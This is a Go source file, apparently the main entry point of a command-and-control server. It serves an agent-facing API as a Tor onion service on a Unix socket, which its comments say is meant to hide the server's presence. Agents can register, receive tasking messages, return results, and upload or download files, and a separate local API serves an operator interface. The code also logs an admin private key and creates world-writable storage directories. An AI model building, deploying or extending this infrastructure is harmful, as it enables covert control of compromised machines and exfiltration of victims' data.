package main

import (
	"api/config"
	"api/core/crypto"
	"api/ctrl/apictrl"
	"api/ctrl/c2ctrl"
	"api/db"
	"api/repos/operatorsRepo"
	"fmt"
	"log"
	"net"
	"net/http"
	"os"
	"strings"
)

func main() {
	// Assures command line arguments are valid enough to run the program.
	// Exits if not.
	config.Validate()

	// Initialize an instance of SQLite database.
	if err := db.Init(*config.DbPath); err != nil {
		fmt.Println("error: writeTorrcConfig:", err)
		os.Exit(1)
	}

	// Creation of administrative operator account.
	if *config.UserInsertAdmin {
		operator, recoveryPhrase, hexEncodedPrivateKey, err := crypto.CreateAdminOperator(*config.UserName)
		if err != nil {
			log.Println("failed to create admin operator account:", err)
			os.Exit(1)
		}

		if err := operatorsRepo.Insert(&operator); err != nil {
			log.Println("failed to inser admin operator account into database:", err)
			os.Exit(1)
		}

		log.Println("Username:", operator.Username)
		log.Println("Recovery Word Phrase:", strings.Join(recoveryPhrase, " "))
		log.Println("Private Key:", hexEncodedPrivateKey)

		os.Exit(0)
	}

	// Clean up previous Unix socket of the API, just in case it's there.
	os.RemoveAll(*config.ApiSockPath)

	// Create directories used for storing files uploaded & downloaded
	// by agents.
	os.MkdirAll(*config.UploadsDirectoryPath, 0777)
	os.MkdirAll(*config.DownloadsDirectoryPath, 0777)

	// "torrc" configuration file contains instructions for how Tor should
	// behave. In our case we use it in order to define our onion service.
	// https://community.torproject.org/onion-services/overview
	// https://support.torproject.org/tbb/tbb-editing-torrc
	if err := writeTorrcConfig(config.ApiSockPath, config.OnionServicePath); err != nil {
		fmt.Println("error: writeTorrcConfig:", err)
		os.Exit(1)
	}

	go func() {
		// Starts the command and control web API to which agents connect to.
		if err := startOnionService(config.ApiSockPath); err != nil {
			fmt.Println("error: startOnionService:", err)
			os.Exit(1)
		}
	}()

	// Starts a web API used by user interface. The two APIs are isolated in
	// this manner because we don't wish a potentially vulnerable endpoint
	// to be publicly exposed on the onion service. Isolation is the key to
	// security of any system.
	if err := startUserFacingService(config.ApiHost); err != nil {
		fmt.Println("error: startUserFacingService:", err)
		os.Exit(1)
	}
}

// writeTorrcConfig writes torrc file onto disk.
func writeTorrcConfig(apiSockPath, onionServiceDirPath *string) (err error) {
	// Specifies directory where our onion service would be stored.
	// Files like hostname, private key, and other important stuff.
	torrc := "HiddenServiceDir " + *onionServiceDirPath

	// Specifies on which virtual port our service would be listening on.
	// Default is 80, however, that doesn't mean it's not secure (as a
	// lot of people associate port 443 with encrypted connection I
	// wish to clarify something). Onion services are end to end encrypted.
	// Onion domain itself is an encoded public key, meaning that if you
	// have a correct onion domain you have guarantees to be connected
	// to a correct server.
	//
	// In our case the Command and Control (C2) web API is listening
	// locally on a Unix socket in order to avoid leaking the C2's
	// presence.
	// https://en.wikipedia.org/wiki/Unix_domain_socket
	torrc += "\nHiddenServicePort 80 unix:" + *apiSockPath

	return os.WriteFile("torrc", []byte(torrc), 0666)
}

// startUserFacingService starts an API used for integration of
// user interfaces.
func startUserFacingService(apiHost *string) (err error) {
	router := http.NewServeMux()

	router.HandleFunc("GET /v1/agents", apictrl.GetAgents)
	router.HandleFunc("GET /v1/messages/{agentID}", apictrl.GetMessages)
	router.HandleFunc("POST /v1/messages", apictrl.InsertMessage)
	router.HandleFunc("GET /v1/channels", apictrl.GetChannels)
	router.HandleFunc("PUT /v1/channels", apictrl.InsertChannel)
	router.HandleFunc("POST /v1/channels/{channelName}", apictrl.UpdateChannel)
	router.HandleFunc("DELETE /v1/channels/{channelName}", apictrl.DeleteChannels)

	server := &http.Server{
		Handler: router,
		Addr:    *apiHost,
	}

	log.Println("user api listening at:", *apiHost)

	if err := server.ListenAndServe(); err != nil {
		return err
	}

	return nil
}

// startOnionService starts command and control API (listening on Unix socket).
func startOnionService(apiSockPath *string) (err error) {
	router := http.NewServeMux()

	router.HandleFunc("GET /v1/{agentID}", c2ctrl.GetMessages)
	router.HandleFunc("POST /v1", c2ctrl.InsertMessageResponse)
	router.HandleFunc("PUT /v1", c2ctrl.InsertAgent)
	router.HandleFunc("GET /v1/files/{fileID}", c2ctrl.DownloadFile)
	router.HandleFunc("PUT /v1/files/{fileID}", c2ctrl.UploadFile)

	listener, err := net.Listen("unix", *apiSockPath)
	if err != nil {
		return err
	}
	defer listener.Close()

	if err := os.Chmod(*apiSockPath, 0666); err != nil {
		return err
	}

	server := &http.Server{
		Handler: router,
	}

	log.Println("c2 listening at:", *apiSockPath)

	if err := server.Serve(listener); err != nil {
		return err
	}

	return nil
}
